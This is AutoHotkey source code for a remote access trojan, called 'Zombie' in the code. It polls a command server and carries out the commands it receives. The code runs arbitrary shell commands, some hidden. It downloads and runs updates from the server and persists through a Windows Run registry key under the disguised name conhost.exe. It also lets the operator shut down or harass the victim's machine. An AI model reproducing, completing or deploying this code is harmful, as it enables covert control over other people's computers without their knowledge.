#include TTS.ahk
global version := "1.2 Release"
global debug := false


; @release mode
#NoTrayIcon

; @debug mode

; Main

global whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
; @update if available
tryUpdate()

loop{
	try{
		whr.Open("GET", Connect.receiveLink, false)
		whr.SetRequestHeader("X-Requested-With", "XMLHttpRequest")
		whr.SetRequestHeader("Content-Type", "text/html;charset=UTF-8")
		whr.Send()
		
		; Zombie.notation("test")
		; break
		
		response := Connect.utfDecode( Connect.urlDecode(whr.ResponseText) )
		Connect.parseResponse(response)
	}
	catch{
		;nothing :)
	}
	sleep 7000
}
ObjRelease(whr)

; Classes / Objects / Methods
; @Zombie
class Zombie{
	static name := A_ComputerName "-" A_UserName
	
	getName(){
		return this.name
	}
	
	getInfo(){
		return A_OSVersion
	}
	
	;A_WinDir "|" A_StartupCommon | A_Desktop
	doCommand(command){
		command := strSplit(command, "::")
		directive := command[1]
		parameter := command[2]
		if(directive != "doCommand"){
			this[directive](parameter) ; call function dynamicaly
		}
	}
	
	; @Received commands
	notation(parameter){
		whr.Open("GET", Connect.getNotationLink(parameter), false)
		whr.SetRequestHeader("X-Requested-With", "XMLHttpRequest")
		whr.SetRequestHeader("Content-Type", "text/html;charset=UTF-8")
		whr.Send()
	}
	
	start(parameter){
		run %parameter%
	}
	
	cmd(parameter){
		run cmd /c %parameter%
	}

	starthidden(parameter){
		run %parameter%,,hide
	}

	msgbox(parameter){
		msgbox, , system, % parameter ;, 5 ;delay
	}

	error(parameter){
		msgbox, 16, system, % parameter ;, 5 ;delay
	}

	wallpaper(parameter){
		UrlDownloadToFile, %parameter%, %A_MyDocuments%\wp.jpg
		DllCall("SystemParametersInfo", UInt, 0x14, UInt, 0, Str, A_MyDocuments . "/wp.jpg", UInt, 1)
	}

	tooltip(parameter){
		ToolTip, %parameter%
		sleep 2200
		ToolTip
	}

	test(parameter){
		ToolTip, parameter, 0, 0
		sleep 2000
		ToolTip
	}

	; @shell
	shell(parameter){
		if(parameter == "exit"){
			exitApp
		}
		else if(parameter == "update"){
			UrlDownloadToFile, % Connect.updateLink, %A_MyDocuments%\Conhost\update.exe
			run %A_MyDocuments%\Conhost\update.exe
			exitApp
			;msgbox % Connect.appLink
		}
		else if(parameter == "install"){
			extension := strSplit(A_ScriptName, ".")
		
			if(extension[2] == "ahk"){
				msgbox you cant install uncompiled app.
			}else{
				fileCreateDir, %A_MyDocuments%\Conhost
				fileCopy %A_ScriptName%, %A_MyDocuments%\Conhost\conhost.exe, 1
				
				;regWrite is doing strange behaviour here :/
				try{
					regWrite, REG_SZ, HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, Conhost, %A_MyDocuments%\Conhost\conhost.exe
				}
				catch{
					msgbox Need admin permission.
				}
				
				run %A_MyDocuments%\Conhost\conhost.exe
				exitApp
			}
		}
		else if(parameter == "uninstall"){
			regDelete, HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, Conhost
			exitApp
		}
	}

	title(parameter){
		WinGetActiveTitle, title
		WinSetTitle, %title%, , %parameter%
	}

	yell(parameter){
		Gui, Color, 010101
		Gui, +LastFound +AlwaysOnTop ; Make the GUI window the last found window for use by the line below.
		WinSet, TransColor, 010101
		
		Gui, -Caption
		gui, font, s80,
		Gui, add, text, w100 cRed, %parameter%
		Gui, show, NA , dick
		sleep 4000
		Gui, destroy
	}

	image(parameter){
		Gui, Color, 010101
		Gui, +LastFound +AlwaysOnTop ; Make the GUI window the last found window for use by the line below.
		WinSet, TransColor, 010101
		
		Gui, -Caption
		gui, font, s80,
		UrlDownloadToFile, %parameter%, %A_MyDocuments%\picture.jpg
		Gui, add, picture, , % A_MyDocuments . "/picture.jpg"
		Gui, show, NA , dick
		sleep 4000
		Gui, destroy
	}

	system(parameter){
		if(parameter == "lcdoff")
			SendMessage 0x112, 0xF170, 2,,Program Manager ; send the monitor into off mode
		else if(parameter == "logout")
			Shutdown, 0
		else if(parameter == "shutdown")
			Shutdown, 1
		else if(parameter == "kill")
			Shutdown, 12
	}
	
	speak(parameter){
		voice := TTS_CreateVoice("IVONA 2 Jacek")
		;TTS(jacek,"SetPitch", 10)	; maximum pitch
		TTS(voice, "SpeakWait", parameter)
		ObjRelease(voice)
	}
	
	volume(parameter){
		soundSet, parameter
	}
}

tryUpdate(){
	if(A_ScriptName == "conhost.ahk" or A_ScriptName == "conhost.exe"){
		fileDelete, %A_MyDocuments%\Conhost\update.exe
	}
	else if(A_ScriptName == "update.ahk" or A_ScriptName == "update.exe"){
		fileCopy, %A_ScriptName%, %A_MyDocuments%\Conhost\conhost.exe, 1
		Zombie.notation("updated to version: " . version)
		run conhost.exe
		exitApp
	}
}

#include Connect.ahk

^r::
if(debug){
	reload
}
return